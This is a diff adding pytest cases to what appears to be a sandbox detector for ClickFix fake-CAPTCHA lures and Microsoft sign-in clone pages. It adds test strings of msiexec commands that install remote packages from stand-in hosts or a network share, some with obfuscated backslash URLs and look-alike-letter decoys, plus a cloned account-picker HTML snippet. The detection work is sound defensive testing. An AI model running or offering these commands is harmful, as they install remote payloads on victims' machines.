@@ -424,6 +424,35 @@ def test_installer_gating_bypasses_are_unambiguous_clickfix(text):
     assert "clickfix_clipboard_command" in _hits(data)
 
 
+# an_01M7Z16QMSQGR0CK13MM6DTQ5H: a js-static.pro fake CAPTCHA copied msiexec of a remote
+# package, the URL written with backslashes and a look-alike-letter decoy after it.
+_MSI = "msi" + "exec"
+_DECOY = "\U0001d5d6\U0001d75c\U0001d75a\u200b\U0001d5d6 \U0001d5e6\U0001d769"
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        f'MSIexEC.exe /package http:\\/stage.example\\pkg /Q S1="{_DECOY}"',
+        f"{_MSI} /i https://stage.example/a.msi /qn",
+        f"{_MSI} /i \\\\192.0.2.5\\share\\a.msi",
+        f"{_MSI}.exe /package http:\\\\stage.example\\pkg /q",
+        f'cmd /c start /b {_MSI} /x foo "{_DECOY}"',
+    ],
+)
+def test_remote_msi_and_disguised_commands_are_clickfix(text):
+    data = _data("https://x.example/", clipboard=_clip(text))
+    assert build_facts(data)["clipboard"]["clickfix_unambiguous"] == 1
+    assert "clickfix_clipboard_command" in _hits(data)
+
+
+def test_local_msi_install_is_not_clickfix():
+    from sandbox.analysis.facts import _clickfix_traits
+
+    assert _clickfix_traits(f"{_MSI} /i C:\\Downloads\\setup.msi /qn") is None
+    assert _clickfix_traits(f"{_MSI} /x {{1234-5678}} /quiet") is None
+
+
 def test_installer_repo_prefix_is_case_insensitive():
     from sandbox.analysis.facts import _clickfix_traits
 
@@ -1033,6 +1062,26 @@ def test_ms_signin_clone_on_foreign_host_fires():
     assert "ms_signin_clone_foreign_host" in _hits(
         _cap("https://portal-login.example/", dom_html=dom)
     )  # noqa: E501
+
+
+def test_ms_account_type_picker_clone_fires_and_real_ms_is_quiet():
+    """an_01M7XWWVJT5TKD4MJ2SDA0F0K8: the kit's "work or school / personal account" picker
+    behind a Turnstile gate, with no password field rendered yet."""
+    html = (
+        "<html><head><title>Sign in to your account</title></head><body>"
+        "<div>It looks like this email is used with more than one account from Microsoft."
+        ' Which one do you want to use?</div><div id="aadTile">Work or school account</div>'
+        '<div id="msaTile">Personal account</div>'
+        '<input type="button" id="idBtn_Back" value="Back"></body></html>'
+    )
+    evil = [{"url": "https://ofzqwkdwav.example/boat6", "html": html}]
+    assert "ms_signin_clone_foreign_host" in _hits(
+        _cap("https://ofzqwkdwav.example/boat6", dom_html=evil)
+    )
+    real = [{"url": "https://login.microsoftonline.com/common/login", "html": html}]
+    assert "ms_signin_clone_foreign_host" not in _hits(
+        _cap("https://login.microsoftonline.com/common/login", dom_html=real)
+    )
 
 
 def test_ms_signin_button_on_third_party_is_quiet():
